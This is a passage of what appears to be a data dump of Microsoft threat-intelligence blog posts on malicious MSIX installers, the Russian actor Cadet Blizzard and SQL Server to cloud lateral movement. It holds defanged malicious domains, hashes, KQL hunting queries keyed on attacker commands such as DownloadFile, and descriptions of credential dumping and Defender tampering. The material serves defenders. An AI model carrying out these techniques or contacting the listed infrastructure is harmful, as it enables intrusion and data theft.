information can help users better spot malicious spoofing by threat actors.\nUsers who click the links to the installers are presented with the desktop App Installer experience.\nIf the user clicks “Install” in the desktop App Installer, the malicious application is installed and eventually runs additional processes and scripts that lead to malware installation.\nStorm-0569 then uses PowerShell and batch scripts that lead to the download of BATLOADER.\nIn one observed instance, Storm-0569’s BATLOADER dropped a Cobalt Strike Beacon followed by data exfiltration using the Rclone data exfiltration tools and Black Basta ransomware deployment by Storm-0506.\nStorm-0569 is an access broker that focuses on downloading post-compromise payloads, such as BATLOADER, through malvertising and phishing emails containing malicious links to download sites.\nThe threat actor also provides malicious installers and landing page frameworks to other actors.\nThey cover multiple infection chains that typically begin with maliciously signed Microsoft Installer (MSI) files posing as legitimate software installations or updates for applications such as TeamViewer, Zoom, and AnyDesk.\nStorm-0569 infection chains have led to additional dropped payloads, including IcedID, Cobalt Strike Beacon, and remote monitoring and management (RMM) tools, culminating in a handoff to ransomware operators like Storm-0846 and Storm-0506.\nStorm-1113 Since mid-November 2023, Microsoft observed Storm-1113’s EugenLoader delivered through search advertisements mimicking the Zoom app.\nOnce a user accesses a compromised website, a malicious MSIX installer (EugenLoader) is downloaded on a device and used to deliver additional payloads.\nThese payloads could include previously observed malware installs, such as Gozi, Redline stealer, IcedID, Smoke Loader, NetSupport Manager (also referred to as NetSupport RAT), Sectop RAT, and Lumma stealer.\nStorm-1113 is a threat actor that acts both as an access broker focused on malware distribution through search advertisements and as an “as-a-service” entity providing malicious installers and landing page frameworks.\nIn Storm-1113 malware distribution campaigns, users are directed to landing pages mimicking well-known software that host installers, often MSI files, that lead to the installation of malicious payloads.\nStorm-1113 is also the developer of EugenLoader, a commodity malware first observed around November 2022.\nSangria Tempest In mid-November 2023, Microsoft observed Sangria Tempest using Storm-1113’s EugenLoader delivered through malicious MSIX package installations.\nSangria Tempest then drops Carbanak, a backdoor used by the actor since 2014, that in turn delivers the Gracewire malware implant.\nIn other cases, Sangria Tempest uses Google ads to lure users into downloading malicious MSIX application packages—possibly relying on Storm-1113 infrastructure—leading to the delivery of POWERTRASH, a highly obfuscated PowerShell script.\nPOWERTRASH is then used to load NetSupport and Gracewire, a malware typically affiliated with the threat actor Lace Tempest, whom Sangria Tempest has cooperated with in past intrusions.\nSangria Tempest (previously ELBRUS, also tracked as Carbon Spider, FIN7) is a financially motivated cybercriminal group currently focusing on conducting intrusions that often lead to data theft, followed by targeted extortion or ransomware deployment such as Clop ransomware.\nStorm-1674 Since the beginning of December 2023, Microsoft identified instances where Storm-1674 delivered fake landing pages through messages delivered using Teams.\nThe landing pages spoof Microsoft services like OneDrive and SharePoint, as well as other companies.\nTenants created by the threat actor are used to create meetings and send chat messages to potential victims using the meeting’s chat functionality.\nThe user is then lured into downloading spoofed applications like the ones shown in figures 5 and 8, which will likely drop SectopRAT or DarkGate.\nIn these cases, Storm-1674 was using malicious installers and landing page frameworks provided by Storm-1113.\nMicrosoft assesses this technique was used to avoid the accept/block screen shown in one-on-one and group chats.\nThe Teams client now shows an accept/block screen for meeting chats sent by an external user.\nMicrosoft has taken action to mitigate the spread of malware from confirmed malicious tenants by blocking their ability to send messages thus cutting off the main method used for phishing.\nStorm-1674 is an access broker known for using tools based on the publicly available TeamsPhisher tool to distribute DarkGate malware.\nStorm-1674 campaigns have typically relied on phishing lures sent over Teams with malicious attachments, such as ZIP files containing a LNK file that ultimately drops DarkGate and Pikabot.\nIn September 2023, Microsoft observed handoffs from Storm-1674 to ransomware operators that have led to Black Basta ransomware deployment.\nRecommendations The ms-appinstaller URI scheme handler has been disabled by default in App Installer build 1.21.3421.0.\nRefer to the Microsoft Security Response Blog for App Installer protection tips.\nMicrosoft recommends the following mitigations to reduce the impact of this threat.\nCheck the recommendations card for the deployment status of monitored mitigations. -\nPilot and deploy phishing-resistant authentication methods for users. -\nImplement Conditional Access authentication strength to require phishing-resistant authentication for employees and external users for critical apps. -\nEducate Microsoft Teams users to verify ‘External’ tagging on communication attempts from external entities, be cautious about what they share, and never share their account information or authorize sign-in requests over chat. -\nApply Microsoft’s security best practices for Microsoft Teams to safeguard Teams users. -\nEducate users to review sign-in activity and mark suspicious sign-in attempts as “This wasn’t me”. -\nEncourage users to use Microsoft Edge and other web browsers that support Microsoft Defender SmartScreen, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that contain exploits and host malware. -\nEducate users to use the browser URL navigator to validate that upon clicking a link in search results they have arrived at an expected legitimate domain. -\nEducate users to verify that the software that is being installed is expected to be published by a legitimate publisher. -\nConfigure Microsoft Defender for Office 365 to recheck links on click.\nSafe Links provides URL scanning and rewriting of inbound email messages in mail flow, and time-of-click verification of URLs and links in email messages, other Microsoft Office applications such as Teams, and other locations such as SharePoint Online.\nSafe Links scanning occurs in addition to the regular anti-spam and anti-malware protection in inbound email messages in Microsoft Exchange Online Protection (EOP).\nSafe Links scanning can help protect your organization from malicious links that are used in phishing and other attacks. -\nTurn on PUA protection in block mode. -\nTurn on attack surface reduction rules to prevent common attack techniques: Appendix Microsoft Defender XDR detections Microsoft Defender Antivirus Microsoft Defender Antivirus detects threat components as the malware listed below.\nEnterprise customers managing updates should select the detection build 1.403.520.0 or newer and deploy it across their environments.\nMicrosoft Defender Antivirus detects associated post-compromise activity as the following: - Trojan:Python/BatLoader - Trojan:PowerShell/BatLoader - Trojan:Win32/Batloader - TrojanDownloader:PowerShell/EugenLoader - Trojan:Win32/EugenLoader - TrojanDownloader:PowerShell/Malgent - Trojan:Win64/Lumma - Trojan:Win32/Gozi - Trojan:Win64/IcedID - Trojan:Win32/Smokeloader - Backdoor:MSIL/SectopRAT - Behavior:Win32/CobaltStrike - Backdoor:Win64/CobaltStrike - HackTool:Win64/CobaltStrike - Ransom:Win32/BlackBasta - Ransom:Linux/BlackBasta Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts can indicate associated threat activity: - An executable loaded an unexpected dll - A process was injected with potentially malicious code - Suspicious sequence of exploration activities - Activity that might lead to information stealer - Possible theft of passwords and other sensitive web browser information The following alerts might also indicate threat activity related to this threat.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nA file or network connection related to ransomware-linked actor Storm-0569 detected - Storm-1113 threat actor detected - Ransomware-linked Sangria Tempest threat activity group detected - Potential BATLOADER activity - Potential IcedID activity - Ongoing hands-on-keyboard attacker activity detected (Cobalt Strike) - Human-operated attack using Cobalt Strike - Possible POWERTRASH loader activity - Carbanak backdoor detected Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects malicious activity associated with this threat.\nThreat intelligence reports Microsoft customers can use the following reports in Microsoft products to get the most up-to-date information about the threat actor, malicious activity, and techniques discussed in this blog.\nThese reports provide the intelligence, protection information, and recommended actions to prevent, mitigate, and respond to associated threats found in customer environments.\nMicrosoft Defender Threat Intelligence - Actor profile: Sangria Tempest - Actor profile: Storm-0506 - Tool profile: BATLOADER - Tool profile: Cobalt Strike - Tool profile: DarkGate - Tool profile: Black Basta ransomware - Tool profile: Lumma stealer - Tool profile: Pikabot Microsoft 365 Defender Threat analytics - Activity profile: Qakbot distributor Storm-0464 shifts to DarkGate and IcedID - Storm-0569: Malvertising and phishing deliver fake software installers and lead to ransomware - Actor profile: Sangria Tempest - IcedID’s frosty arrival can lead to data theft Hunting queries Microsoft Defender XDR Use this query to review all the ms-appinstaller protocol handler invoked network connections in your environment.\nDeviceNetworkEvents | where InitiatingProcessCommandLine == '\"AppInstaller.exe\" -ServerName:App.\nAppX9rwyqtrq9gw3wnmrap9a412nsc7145qh.mca' and RemoteUrl has_any (\"https://\", \"http://\") Indicators of compromise Storm-0569 indicators related to App Installer abuse SHA-256 - 48aa2393ef590bab4ff2fd1e7d95af36e5b6911348d7674347626c9aaafa255e - 11b71429869f29122236a44a292fde3f0269cde8eb76a52c89139f79f4b97e63 - 7e646dfe7b7f330cb21db07b94f611eb39f604fab36e347fb884f797ba462402 - ffb45dc14ea908b21e01e87ec18725dff560c093884005c2b71277e2de354866 - b79633917e51da2a4401473d08719f493d61fd64a1b10fe482c12d984d791ccb URLs - hxxps://scheta[.]site/api.store/ZoomInstaller.msix - hxxps://scheta[.]site/api.store/Setup.msix Domain names - teannviewer.ithr[.]org - tab1eu.ithr[.]org - amydeks.ithr[.]org - zoonn.ithr[.]org - scheta[.]site - tnetworkslicense[.]ru - 1204knos[.]ru - 1204networks[.]ru - abobe.ithr[.]org Storm-0506 Cobalt Strike beacon C2: - gertefin[.]com - septcntr[.]com Storm-1113 indicators related to App Installer abuse SHA-256 - 44cac5bf0bab56b0840bd1c7b95f9c7f5078ff417705eeaaf5ea5a2167a81dd5 Domain names - info-zoomapp[.]com - zoonn[.]meetlng[.]group Sangria Tempest indicators related to App Installer abuse Domain names - storageplace[.]pro - sun1[.]space SHA-256 - 2ba527fb8e31cb209df8d1890a63cda9cd4433aa0b841ed8b86fa801aff4ccbd - 06b4aebbc3cd62e0aadd1852102645f9a00cc7eea492c0939675efba7566a6de Storm-1674 indicators related to App Installer abuse SHA-256 - 2ed5660c7b768b4c2a7899d00773af60cd4396f24a2f7d643ccc1bf74a403970 Domain names: - nixonpeabody[.]tech-department[.]us - amgreetings[.]tech-department[.]us - cbre[.]tech-department[.]us - tech-department[.]us - kellyservices-hr[.]com - hubergroup[.]tech-department[.]us - formeld[.]tech-department[.]us - kellyhrservices-my[.]sharepoint[.]com - kellyserviceshr-my[.]sharepoint[.]com - kellyservicesrecruitmentdep-my[.]sharepoint[.]com - kellyservicesheadhunter-my[.]sharepoint[.]com - mckinseyhrcompany-my[.]sharepoint[.]com - webmicrosoftservicesystem[.]com - perimeter81support-my[.]sharepoint[.]com - cabotcorpsupport-my[.]sharepoint[.]com References - Malvertising Surges to Distribute Malware (Intel471) - Microsoft Security Response Blog - CVE-2021-43890 Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on LinkedIn at https://www.linkedin.com/showcase/microsoft-threat-intelligence, and on X (formerly Twitter) at https://twitter.com/MsftSecIntel.\nTo hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast: https://thecyberwire.com/podcasts/microsoft-threat-intelligence.","num_sentences":74,"metadata":{"source":"blog","platform":"Microsoft","filename":"app-installer"}}
{"id":55,"title":"Cadet Blizzard emerges as a novel and distinct Russian threat actor | Microsoft Security Blog","publish_date":"2022-01-28","link":"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/","clean_text":"As Russia’s invasion of Ukraine continues into its second year and Microsoft continues to collaborate with global partners in response, the exposure of destructive cyber capabilities and information operations provide greater clarity into the tools and techniques used by Russian state-sponsored threat actors.\nThroughout the conflict, Russian threat actors have deployed a variety of destructive capabilities with varying levels of sophistication and impact, which showcase how malicious actors rapidly implement novel techniques during a hybrid war, along with the practical limitations of executing destructive campaigns when significant operational errors are made and the security community rallies around defense.\nThese insights help security researchers continuously refine detection and mitigation capabilities to defend against such attacks as they evolve in a wartime environment.\nToday, Microsoft Threat Intelligence is sharing updated details about techniques of a threat actor formerly tracked as DEV-0586—a distinct Russian state-sponsored threat actor that has now been elevated to the name Cadet Blizzard.\nAs a result of our investigation into their intrusion activity over the past year, we have gained high confidence in our analysis and knowledge of the actor’s tooling, victimology, and motivation, meeting the criteria to convert this group to a named threat actor.\nMicrosoft assesses that Cadet Blizzard operations are associated with the Russian General Staff Main Intelligence Directorate (GRU) but are separate from other known and more established GRU-affiliated groups such as Forest Blizzard (STRONTIUM) and Seashell Blizzard (IRIDIUM).\nWhile Microsoft constantly tracks a number of activity groups with varying degrees of Russian government affiliation, the emergence of a novel GRU affiliated actor, particularly one which has conducted destructive cyber operations likely supporting broader military objectives in Ukraine, is a notable development in the Russian cyber threat landscape.\nA month before Russia invaded Ukraine, Cadet Blizzard foreshadowed future destructive activity when it created and deployed WhisperGate, a destructive capability that wipes Master Boot Records (MBRs), against Ukrainian government organizations.\nCadet Blizzard is also linked to the defacements of several Ukrainian organization websites, as well as multiple operations, including the hack-and-leak forum known as “Free Civilian”.\nMicrosoft has tracked Cadet Blizzard since the deployment of WhisperGate in January 2022.\nWe assess that they have been operational in some capacity since at least 2020 and continue to perform network operations through the present.\nOperationally consistent with the remit and assessed objectives of GRU-led operations throughout Russia’s invasion of Ukraine, Cadet Blizzard has engaged in focused destructive attacks, espionage, and information operations in regionally significant areas.\nCadet Blizzard’s operations, though comparatively less prolific in both scale and scope to more established threat actors such as Seashell Blizzard, are structured to deliver impact and frequently run the risk of hampering continuity of network operations and exposing sensitive information through targeted hack-and-leak operations.\nPrimary targeted sectors include government organizations and information technology providers in Ukraine, although organizations in Europe and Latin America have also been targeted.\nMicrosoft has been working with CERT-UA closely since the beginning of Russia’s war in Ukraine and continues to support the country and neighboring states in protecting against cyberattacks, such as the ones carried out by Cadet Blizzard.\nAs with any observed nation-state actor activity, Microsoft directly and proactively notifies customers that have been targeted or compromised, providing them with the information they need to guide their investigations.\nMicrosoft is also actively working with members of the global security community and other strategic partners to share information that can address this evolving threat through multiple channels.\nHaving elevated this activity to a distinct threat actor name, we’re sharing this information with the larger security community to provide insights to protect and mitigate Cadet Blizzard as a threat.\nOrganizations should actively take steps to protect environments against Cadet Blizzard, and this blog further aims to discuss how to detect and prevent disruption.\nWho is Cadet Blizzard?\nCadet Blizzard is a Russian GRU-sponsored threat group that Microsoft began tracking following disruptive and destructive events occurring at multiple government agencies in Ukraine in mid-January 2022.\nDuring this time, Russian troops backed with tanks and artillery were surrounding the Ukrainian border as the military prepped for an offensive attack.\nThe defacements of key Ukrainian institutions’ websites, coupled with the WhisperGate malware, prefaced multiple waves of attacks by Seashell Blizzard that followed when the Russian military began their ground offensive a month later.\nCadet Blizzard compromises and maintains a foothold on affected networks for months, often exfiltrating data prior to disruptive actions.\nMicrosoft observed Cadet Blizzard’s activity peak between January and June 2022, followed by an extended period of reduced activity.\nThe group re-emerged in January 2023 with increased operations against multiple entities in Ukraine and in Europe, including another round of website defacements and a new “Free Civilian” Telegram channel affiliated with the hack-and-leak front under the same name that first emerged in January 2022, around the same time as the initial defacements.\nCadet Blizzard actors are active seven days of the week and have conducted their operations during their primary European targets’ off-business hours.\nMicrosoft assesses that NATO member states involved in providing military aid to Ukraine are at greater risk.\nCadet Blizzard seeks to conduct disruption, destruction, and information collection, using whatever means are available and sometimes acting in a haphazard fashion.\nWhile the group carries high risk due to their destructive activity, they appear to operate with a lower degree of operational security than that of longstanding and advanced Russian groups such as Seashell Blizzard and Forest Blizzard.\nAdditionally, as is the case with other Russian state-sponsored threat groups, Microsoft assesses that at least one Russian private sector organization has materially supported Cadet Blizzard by providing operational support including during the WhisperGate destructive attack.\nTargets Cadet Blizzard’s operations are global in scope but consistently affect regional hotspots in Ukraine, Europe, Central Asia, and, periodically, Latin America.\nCadet Blizzard likely prioritizes target networks based on requirements consistent with Russian military or intelligence objectives such as geolocation or perceived impact.\nCadet Blizzard, consistent with a Russian military-associated threat actor, continues to mainly target Ukraine, although the relative scope of impact of Cadet Blizzard’s destructive activity is minimal compared to the multiple waves of destructive attacks that we attribute to Seashell Blizzard.\nIn January 2022, Cadet Blizzard launched destructive attacks in Ukraine in the following industry verticals: - Government services - Law enforcement - Non-profit/non-governmental organization - IT service providers/consulting - Emergency services Cadet Blizzard has repeatedly targeted information technology providers and software developers that provide services to government organizations using a supply chain “compromise one, compromise many” technique.\nThe group’s January 2022 compromise of government entities in Ukraine probably were at least in part due to access and information gained during a breach of an information technology provider that often worked with these organizations.\nPrior to the war in Ukraine, Cadet Blizzard performed historical compromises of several Eastern European entities as well, primarily affecting the government and technology sectors as early as April 2021.\nAs the war continues, Cadet Blizzard activity poses an increasing risk to the broader European community, specifically any successful attacks against governments and IT service providers, which may give the actor both tactical and strategic-level insight into Western operations and policy surrounding the conflict.\nGaining heightened levels of access into these targeted sectors may also enable Cadet Blizzard to carry out retaliatory demonstrations in opposition to the West’s support for Ukraine.\nTools, tactics, and procedures Cadet Blizzard is a conventional network operator and commonly utilizes living-off-the-land techniques after gaining initial access to move laterally through the network, collect credentials and other information, and deploy defense evasion techniques and persistence mechanisms.\nUnlike other Russian-affiliated groups that historically prefer to remain undetected to perform espionage, the result of at least some notable Cadet Blizzard operations are extremely disruptive and are almost certainly intended to be public signals to their targets to achieve the larger objective of destruction, disruption, and possibly, intimidation.\nInitial access Cadet Blizzard predominantly achieves initial access through exploitation of web servers commonly found on network perimeters and DMZs.\nCadet Blizzard is also known for exploiting Confluence servers through the CVE-2021-26084 vulnerability, Exchange servers through multiple vulnerabilities including CVE-2022-41040 and ProxyShell, and likely commodity vulnerabilities in various open-source platforms such as content management systems.\nPersistence Cadet Blizzard frequently persists on target networks through the deployment of commodity web shells used either for commanding or tunneling.\nCommonly utilized web shells include P0wnyshell, reGeorg, PAS, and even custom variants included in publicly available exploit kits.\nIn February 2023, CERT-UA reported an attempted attack against a Ukrainian state information system that involved a variant of the PAS web shell, which Microsoft assesses to be unique to Cadet Blizzard operations at the time of the intrusion.\nPrivilege escalation and credential harvesting Cadet Blizzard has leveraged a variety of living-off-the-land techniques to conduct privilege escalation and harvesting of credentials. -\nDumping LSASS – Cadet Blizzard uses Sysinternals tools such as procdump to dump LSASS in suspected offline credential harvesting efforts.\nCadet Blizzard frequently renames procdump64 to alternative names, such as dump64.exe. -\nDumping registry hives – Cadet Blizzard extracts registry hives using native means via reg save.\nLateral movement Cadet Blizzard conducts lateral movement with valid network credentials obtained from credential harvesting.\nTo conduct lateral movement more efficiently, Cadet Blizzard typically uses modules from the publicly available Impacket framework.\nWhile this framework is generically utilized by multiple actors, preferential execution of patterns of commands may allow for more precision profiling of Cadet Blizzard operations: - PowerShell get-volume to enumerate the volume of a device - Copying critical registry hives that contain password hashes and computer information - Downloading files directly from actor-owned infrastructure via the PowerShell DownloadFile commandlet Command execution and C2 Cadet Blizzard periodically uses generic socket-based tunneling utilities to facilitate command and control (C2) to actor-controlled infrastructure.\nPayloads such as NetCat and Go Simple Tunnel (GOST) are commonly renamed to blend into the operating system but are used to shovel interactive command prompts over established sockets.\nFrequently, remote command execution may be facilitated through remotely scheduled tasks.\nThe group has also sparingly utilized Meterpreter.\nOperational security Cadet Blizzard utilizes anonymization services IVPN, SurfShark, and Tor as their anonymization layer during select operations.\nAnti-forensics Cadet Blizzard has been observed leveraging the Win32_NTEventlogFile commandlet in PowerShell to extract both system and security event logs to an operational directory.\nThe activities are anticipated to be consistent with anti-forensics activities. -\nCommon file targets during extraction are: - sec.evtx - sys.evtx - Cadet Blizzard commonly deletes files used during operational phases seen in lateral movement. -\nCadet Blizzard malware implants are known to disable Microsoft Defender Antivirus through a variety of means: - NirSoft AdvancedRun utility, which is used to disable Microsoft Defender Antivirus by stopping the WinDefend service. -\nDisable Windows Defender.bat, which presumably disables Microsoft Defender Antivirus via the registry.\nImpact assessment Cadet Blizzard typically collects information en-masse from targeted servers.\nIf mail servers are affected, Cadet Blizzard typically attempts to collect mail, placing incident response communications at risk.\nCredential material (such as SSH keys) are also a common target to provide methods for re-entry if a full remediation does not occur.\nAs was the case with the WhisperGate operation in January 2022, Cadet Blizzard is known to deploy destructive malware to select target environments to delete data and render systems inoperable.\nAlso in January of 2022, Microsoft identified that data exfiltrated by Cadet Blizzard in compromises of various Ukrainian organizations was leaked on a Tor .onion site under the name “Free Civilian.”\nThe organizations from which data was leaked strongly correlated to multiple Cadet Blizzard compromises earlier in 2022, leading Microsoft to assess that this forum is almost certainly linked to Cadet Blizzard.\nIn February 2023, a new Telegram channel was established under the same “Free Civilian” moniker, suggesting that Cadet Blizzard intends to continue conducting information operations in the second year of the war.\nHowever, the public channel only has 1.3K followers with posts getting at most a dozen reactions as of the time of publication, signifying low user interaction.\nA private channel assumed to be operated by the same group appears to have shared data with 748 of those subscribers.\nRelated ecosystems Cadet Blizzard operations do not occur in a silo; there have been substantial technical indicators of intersection with other malicious cyber activity that may have a broader scope or a nexus outside of Russia.\nThey have at times utilized services associated with these ecosystems such as Storm-0587, discussed below, as well as having support from at least one private sector enabler organization within Russia.\nThough there have been various forms of intersections in threat activity, when these groups have been observed operating independently, the tactics, techniques, procedures (TTPs) and capabilities have often been distinct—therefore making it operationally valuable to distinguish these activity groups.\nStorm-0587 Storm-0587 is a cluster of activity beginning as early as April 2021 involving a series of weaponized documents predominantly delivered in phishing operations usually to distribute a series of downloaders and document stealers.\nOne of Storm-0587’s trademark tools is SaintBot, an uncommon downloader that often appears in spear-phishing emails.\nThis downloader can be customized to deploy almost anything as the payload, but in Ukraine, the malware often deploys a version of an AutoIT information stealer that collects documents on the machine that threat actors deem of interest.\nThis specific version of the malware has been named OUTSTEEL by CERT UA and has been observed in several attacks, such as a fake version of the Office of the President of Ukraine’s website created in July 2021 that hid weaponized documents, including OUTSTEEL, that would download onto victim’s machines when the documents are clicked.\nMitigation and protection guidance Defending against Cadet Blizzard Activities linked to Cadet Blizzard indicate that they are comprehensive in their approach and have demonstrated an ability to hold networks at risk of continued compromise for an extended period of time.\nA comprehensive approach to incident response may be required in order to fully remediate from Cadet Blizzard operations.\nOrganizations can bolster security of information assets and expedite incident response by focusing on areas of risk based on actor tradecraft enumerated within this report.\nUse the included indicators of compromise to investigate environments and assess for potential intrusion. -\nReview all authentication activity for remote access infrastructure, with a particular focus on accounts configured with single factor authentication, to confirm authenticity and investigate any anomalous activity. -\nEnable multifactor authentication (MFA) to mitigate potentially compromised credentials and ensure that MFA is enforced for all remote connectivity.\nNOTE: Microsoft strongly encourages all customers download and use password-less solutions like Microsoft Authenticator to secure accounts. -\nEnable controlled folder access (CFA) to prevent MBR/VBR modification. -\nBlock process creations originating from PSExec and WMI commands to stop lateral movement utilizing the WMIexec component of Impacket. -\nTurn on cloud-delivered protection in Microsoft Defender Antivirus, turned on by default in Windows, or the equivalent for your chosen antivirus product to cover rapidly evolving attacker tools and techniques.\nCloud-based machine learning protections block a huge majority of new and unknown variants.\nHunting for Cadet Blizzard hands-on-keyboard activity To uncover malicious hands-on-keyboard activities in environments, identify any unusual or unexpected commands or tools launched on systems as well as the presence of any unusual directories or files that could be used for staging or storing malicious tools.\nUse the common commands, tools, staging directories, and indicators of compromise listed below to help identify Cadet Blizzard intrusion and hands-on-keyboard activity in environments.\nCommon commands - systeminfo to fingerprint a device after lateral movement - get-volume to fingerprint a device after lateral movement - nslookup to research specific devices (IP) and FQDNs internally - Get-DnsServerResourceRecord to conduct reconnaissance of an internal DNS namespace - query session to profile RDP connections - route print to enumerate routes available on the devices - DownloadFile via PowerShell to download payloads from external servers Common tool staging directories - C:\\ProgramData - C:\\PerfLogs - C:\\Temp - C:\\ - Subdirectories of legitimate (or fake) user accounts within %APPDATA%\\Temp - Subdirectories with the name USOPublic in the path Common tools - Tor - Python - SurfShark - Teamviewer - Meterpreter named as dbus-rpc.exe in known instances - IVPN - NGROK - GOST.exe frequently masked as USORead.exe - regeorg web shell Indicators of compromise (IOCs) | IOC | Type | Description | |---|---|---| | justiceua[.]org | Domain | Sender for non-weaponized emails containing only antagonistic messaging: volodimir_azov@justiceua[.]org | | 179.43.187[.]33 | IP address | Hosted the JusticeUA operation between March and April 2022 | | 3a2a2de20daa74d8f6921230416ed4e6 | PE Import Hash | PE Import Hash matching WhisperGate malware | | 3e4bb8089657fef9b8e84d9e17fd0d7740853c4c0487081dacc4f22359bade5c | SHA-256 | Web shell – p0wnyshell (not unique to Cadet Blizzard) | | 20215acd064c02e5aa6ae3996b53f5313c3f13625a63da1d3795c992ea730191 | SHA-256 | Web shell – p0wnyshell (not unique to Cadet Blizzard) | | 3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4 | SHA-256 | Web shell – WSO Shell (not unique to Cadet Blizzard) | | 23d6611a730bed886cc3b4ce6780a7b5439b01ddf6706ba120ed3ebeb3b1c478 | SHA-256 | Web shell – reGeorg (not unique to Cadet Blizzard) | | 7fedaf0dec060e40cbdf4ec6d0fbfc427593ad5503ad0abaf6b943405863c897 | SHA-256 | Web shell – PAS (may not be unique to Cadet Blizzard) | Microsoft 365 Defender detections Microsoft Defender Antivirus Microsoft Defender Antivirus detects behavioral components of techniques this threat actor uses as the following: - Behavior:Win32/WmiprvseRemoteProc Microsoft Defender Antivirus detects the WhisperGate malware attributed to this threat actor with the following family: - WhisperGate Microsoft Defender for Endpoint The following Microsoft Defender for Endpoint alerts can indicate associated threat activity: - Cadet Blizzard activity detected - Possible Storm-0587 activity detected The following alerts might also indicate threat activity related to this threat.\nNote, however, that these alerts can be also triggered by unrelated threat activity. -\nOngoing hands-on-keyboard attack via Impacket toolkit - Suspicious PowerShell command line - Suspicious WMI process creation Microsoft Defender Vulnerability Management Microsoft Defender Vulnerability Management surfaces devices that may be affected by the following vulnerabilities used in this threat: - CVE-2021-26084 - CVE-2020-1472 - CVE-2021-4034 Hunting queries Microsoft 365 Defender Microsoft 365 Defender customers can run the following query to find related activity in their networks: Check for WMIExec Impacket activity with common Cadet Blizzard commands DeviceProcessEvents | where InitiatingProcessFileName =~ \"WmiPrvSE.exe\" and FileName =~ \"cmd.exe\" | where ProcessCommandLine matches regex \"2>&1\" | where ProcessCommandLine has_any (\"get-volume\",\"systeminfo\",\"reg.exe\",\"downloadfile\",\"nslookup\",\"query session\",\"route print\") Find PowerShell file downloads DeviceProcessEvents | where FileName == \"powershell.exe\" and ProcessCommandLine has \"DownloadFile\" Scheduled task creation, command execution and C2 communication DeviceProcessEvents | where Timestamp > ago(14d) | where FileName =~ \"schtasks.exe\" | where (ProcessCommandLine contains \"splservice\" or ProcessCommandLine contains \"spl32\") and (ProcessCommandLine contains \"127.0.0.1\" or ProcessCommandLine contains \"2>&1\") Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with “TI map”) to automatically match indicators associated with Cadet Blizzard in Microsoft Defender Threat Intelligence (MDTI) with data in their workspace.\nIf the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the MDTI connector and analytics rule deployed in their Sentinel workspace.\nMore details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy.\nMicrosoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above. -\nWeb Shell Activity - Commands executed by WMI - Potential Impacket Execution - Dumping LSASS using procdump - Potential Microsoft Defender Tampering References - https://www.npr.org/2022/01/14/1073001754/ukraine-cyber-attack-government-websites-russia - https://github.com/flozz/p0wny-shell - https://github.com/sensepost/reGeorg - https://cert.gov.ua/article/3947787 - https://github.com/fortra/impacket - https://intezer.com/blog/malware-analysis/targeted-phishing-attack-against-ukrainian-government-expands-to-georgia/ Further reading For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.\nTo get notified about new publications and to join discussions on social media, follow us on Twitter at https://twitter.com/MsftSecIntel.","num_sentences":99,"metadata":{"source":"blog","platform":"Microsoft","filename":"cadet-blizzard"}}
{"id":56,"title":"Defending new vectors: Threat actors attempt SQL Server to cloud lateral movement | Microsoft Security Blog","publish_date":null,"link":"https://www.microsoft.com/en-us/security/blog/2023/10/03/defending-new-vectors-threat-actors-attempt-sql-server-to-cloud-lateral-movement/","clean_text":"Microsoft security researchers recently identified a campaign where attackers attempted to move laterally to a cloud environment through a SQL Server instance.\nThis attack technique demonstrates an approach we’ve seen in other cloud services such as VMs and Kubernetes cluster, but not in SQL Server.\nThe attackers initially exploited a SQL injection vulnerability in an application within the target’s environment.\nThis allowed the attacker to gain access and elevated permissions on a Microsoft SQL Server instance deployed in Azure Virtual Machine (VM).\nThe attackers then used the acquired elevated permission to attempt to move laterally to additional cloud resources by abusing the server’s cloud identity.\nCloud identities are commonly used in cloud services including SQL Server and may possess elevated permissions to carry out actions in the cloud.\nThis attack highlights the need to properly secure cloud identities to defend SQL Server instances and cloud resources from unauthorized access.\nThe attack flow we observed initiated multiple Microsoft Defender for SQL alerts that allowed us to identify and analyse the cloud lateral movement technique.\nThe alerts also allowed us to quickly deploy additional protections despite not having visibility of the application that was targeted with the SQL injection vulnerability to access the SQL Server.\nWhile our analysis of this attack did not yield any indication that the attackers successfully moved laterally to the cloud resources, we assess that it is important for defenders to be aware of this technique used in SQL Server instances, and what steps to take to mitigate potential attacks.\nIn this blog post, we elaborate on the attack flow and focus on the main technique that we observed: SQL Server to cloud lateral movement.\nWe will also show how Microsoft Defender for SQL can detect activities related to this type of threat and help responders mitigate such attacks.\nCloud-based lateral movement As more organizations move to the cloud, we see new types of cloud-based attack techniques that are fundamentally different than the ones that are known from on-premises environments.\nAn example of this is how attackers are finding new vectors to perform lateral movement from certain on-premises environments into cloud resources.\nIn cloud environments, one of the methods to perform lateral movement is by abusing cloud identities that are bound to the cloud resource.\nCloud services like Azure use managed identities for allocating identities to the various cloud resources.\nThose identities are used for authentication with other cloud resources and services.\nWhile managed identities offer advantages in terms of convenience, security, and efficiency, they also come with certain risks that introduce a potential attack vector.\nFor example, if attackers compromised a VM, they could acquire a token for its attached identity by querying the instance metadata service (IMDS) endpoint.\nWith the managed identity access token, the attackers could perform various malicious operations on the cloud resources that the identity has access to.\nIn the attack we observed, the attackers attempted to perform identity-based lateral movement in an environment where we haven’t seen this technique used before: SQL Server instances.\nKnown technique, new environment: from SQL Server to cloud While the attempt to move laterally from the SQL Server instance can be considered new, the attack involved activities common to SQL Server attacks.\nFor example, the initial access vector was a successful SQL injection attack that allowed the attackers to run queries on the SQL Server.\nThe attackers launched numerous SQL statements to gather data about the host, databases, and network configuration.\nThe information that the attackers collected included: - Databases - Table names and schema - 